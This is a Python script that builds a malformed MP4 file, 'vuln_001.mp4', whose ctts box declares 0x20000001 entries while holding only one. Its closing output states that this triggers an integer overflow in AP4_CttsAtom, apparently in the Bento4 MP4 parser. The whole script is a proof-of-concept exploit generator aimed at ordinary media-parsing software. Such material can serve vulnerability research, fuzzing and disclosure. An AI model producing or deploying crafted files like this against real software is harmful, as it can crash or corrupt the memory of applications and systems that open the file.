import struct
import os

def box(type4, data):
    return struct.pack('>I', len(data) + 8) + type4.encode() + data

def fullbox(type4, version, flags, data):
    return box(type4, struct.pack('>B', version) + flags.to_bytes(3, 'big') + data)

# ftyp
ftyp = box('ftyp', b'isom' + struct.pack('>I', 0x200) + b'isom' + b'iso2' + b'mp41')

# ctts box: entry_count = 0x20000001, but only 1 real entry in file
# fullbox adds version(1B) + flags(3B), so payload = entry_count(4B) + entries(8B)
ctts_payload = struct.pack('>I', 0x20000001) + struct.pack('>II', 1, 0)
ctts = fullbox('ctts', 0, 0, ctts_payload)

# stts (required): entry_count=1, sample_count=1, sample_delta=1
stts_payload = struct.pack('>I', 1) + struct.pack('>II', 1, 1)
stts = fullbox('stts', 0, 0, stts_payload)

# stsc: entry_count=1, first_chunk=1, samples_per_chunk=1, sample_desc_idx=1
stsc_payload = struct.pack('>I', 1) + struct.pack('>III', 1, 1, 1)
stsc = fullbox('stsc', 0, 0, stsc_payload)

# stsz: sample_size=0, sample_count=1, entry_size=0
stsz_payload = struct.pack('>II', 0, 1) + struct.pack('>I', 0)
stsz = fullbox('stsz', 0, 0, stsz_payload)

# stco: entry_count=1, chunk_offset pointing into mdat
stco_payload = struct.pack('>I', 1) + struct.pack('>I', 8)
stco = fullbox('stco', 0, 0, stco_payload)

# stsd: entry_count=1 + mp4a sample entry
mp4a_data = b'\x00' * 6 + struct.pack('>H', 1)   # reserved(6) + data_ref_idx
mp4a_data += b'\x00' * 8                           # reserved
mp4a_data += struct.pack('>HH', 2, 16)             # channel_count=2, sample_size=16
mp4a_data += b'\x00\x00'                           # pre_defined
mp4a_data += b'\x00\x00'                           # reserved
mp4a_data += struct.pack('>I', 44100 << 16)        # samplerate
mp4a = box('mp4a', mp4a_data)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = fullbox('stsd', 0, 0, stsd_payload)

stbl = box('stbl', stsd + stts + ctts + stsc + stsz + stco)

# dinf/dref
url_data = b''
url = fullbox('url ', 0, 1, url_data)   # flags=1: self-contained
dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url)
dinf = box('dinf', dref)

# smhd
smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))

minf = box('minf', smhd + dinf + stbl)

# mdhd
mdhd_payload = struct.pack('>IIIII', 0, 0, 44100, 1, 0) + struct.pack('>H', 0)
mdhd = fullbox('mdhd', 0, 0, mdhd_payload)

# hdlr
hdlr_payload = (struct.pack('>II', 0, 0) + b'soun' +
                struct.pack('>III', 0, 0, 0) + b'SoundHandler\x00')
hdlr = fullbox('hdlr', 0, 0, hdlr_payload)

mdia = box('mdia', mdhd + hdlr + minf)

# tkhd
tkhd_payload = struct.pack('>IIIII', 0, 0, 1, 0, 1)   # create, mod, track_id, reserved, duration
tkhd_payload += struct.pack('>II', 0, 0)               # reserved
tkhd_payload += struct.pack('>hh', 0, 0)               # layer, alternate_group
tkhd_payload += struct.pack('>hh', 0x0100, 0)          # volume, reserved
# unity matrix
tkhd_payload += (b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                 b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00')
tkhd_payload += struct.pack('>II', 0, 0)               # width, height
tkhd = fullbox('tkhd', 0, 3, tkhd_payload)

trak = box('trak', tkhd + mdia)

# mvhd
mvhd_payload = struct.pack('>IIIII', 0, 0, 1000, 1, 0x00010000)  # create, mod, timescale, duration, rate
mvhd_payload += struct.pack('>h', 0x0100)   # volume
mvhd_payload += b'\x00' * 10               # reserved
# unity matrix
mvhd_payload += (b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                 b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00')
mvhd_payload += b'\x00' * 24               # pre_defined
mvhd_payload += struct.pack('>I', 2)       # next_track_id
mvhd = fullbox('mvhd', 0, 0, mvhd_payload)

moov = box('moov', mvhd + trak)

# mdat (minimal - 8 byte header only)
mdat = struct.pack('>I', 8) + b'mdat'

data = ftyp + moov + mdat

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(data)
print(f'Written {len(data)} bytes to {out_path}')
print(f'ctts entry_count = 0x20000001 ({0x20000001}), actual entries in file = 1')
print(f'ctts box size = {len(ctts)} bytes (triggers integer overflow in AP4_CttsAtom)')
